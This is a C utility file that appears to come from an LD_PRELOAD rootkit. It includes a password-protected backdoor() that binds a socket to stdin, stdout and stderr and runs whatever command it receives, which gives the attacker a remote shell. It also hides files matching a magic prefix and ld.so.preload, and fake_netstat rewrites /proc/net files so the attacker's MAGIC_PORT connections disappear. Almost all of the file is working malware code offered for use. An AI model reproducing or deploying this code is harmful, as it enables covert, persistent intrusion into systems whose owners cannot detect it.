#include "utils.h"

/*
 * Function:  matches_reg 
 * --------------------
 * matches regular expression
 *
 *  reg: regular expression
 *  str: string to be matched
 *
 *  returns: 1 if matches otherwise 0  
 */
int matches_reg(const char *reg, const char *str){
    regex_t regex;
    int reti = regcomp(&regex, reg, REG_EXTENDED);
    if (reti){
        return 0;
    }
    reti = regexec(&regex, str, 0 , NULL, 0);
    if (!reti){
        return 1;
    }
    return 0;
}

/*
 * Function:  is_magicfile
 * --------------------
 * check if filename has given prefix
 *
 *  filename: the pointer to the file name
 *
 *  returns: 1 if matches otherwise 0  
 */
int is_magicfile(const char *filename){
    char *file = basename(filename);
    char magic_re[256] = "(^ld\\.so\\.preload$|";
    strcat(magic_re, MAGIC_PREFIX);
    strcat(magic_re,")");
    return matches_reg(magic_re, file);
}

/*
 * Function:  is_net_file
 * --------------------
 * check if filename has given prefix
 *
 *  filename: the pointer to the file name
 *
 *  returns: 1 if matches otherwise 0  
 */
int is_net_file(const char *pathname){
    return matches_reg("^/proc(/[0-9]+)?/net/[a-z0-9]+$", pathname);
}

/*
 * Function:  fake_netstat
 * --------------------
 * creates a fakenetstat file given the original purging it from MAGIC_PORT
 *
 *  f: function point to fopen or fopen64
 *  pathname: full the path name
 *  newfile: file pointer to new filename string that will be filled
 *
 *  returns: 1 if works otherwise 0  
 */
int fake_netstat(char *pathname, char *newfile){
	if(!hooked_fopen){
		hooked_fopen = load_libc("fopen");
	}
    FILE *real_fp = hooked_fopen(pathname, "r");
    if (!real_fp){
        return 0;
    }
    strcpy(newfile,FAKE_NETSTAT_FILE);
    char *proto = basename(pathname);
    strcat(newfile,proto);
    FILE *fake_fp = hooked_fopen(newfile,"w");
    char hex_port[7]; 
    sprintf(hex_port, ":%04X ", MAGIC_PORT);

    char str[256];
    while (fgets(str, 256, real_fp)){
        if (strstr(str, hex_port) == NULL){
            fputs(str, fake_fp);
        }
    }
    fclose(fake_fp);
    return 1;
}

void uninstall(){
    unlink(MAGIC_LIBPATH);
}

void spawn_shell(int fd, char *cmd){
    dup2(fd, 0); //stdin
    dup2(fd, 1); //stdout
    dup2(fd, 2); //stderr

    system(cmd);
}

void readline(int fd, char *buff, int size){
    int l = 0;
    int c = 'X';
    while (c && c != '\n' && l < size){
        read(fd, &c, 1);
        buff[l] = c;
        l++;
    }
    buff[l-1] = '\0';
}

void *backdoor(void *args){
    int fd = *((int *) args);
    write(fd, "PASS>", 5);
    char buff[1024];
    readline(fd, buff, sizeof(buff));
    if (strcmp(buff, PASSWORD) != 0){
        char lovephrase[] = "Fuck off.\n";
        write(fd, lovephrase, sizeof(lovephrase));
        close(fd);
        return NULL;
    }
    write(fd,"CMD>",4);
    readline(fd, buff, sizeof(buff));
    spawn_shell(fd, buff);
    close(fd);
}
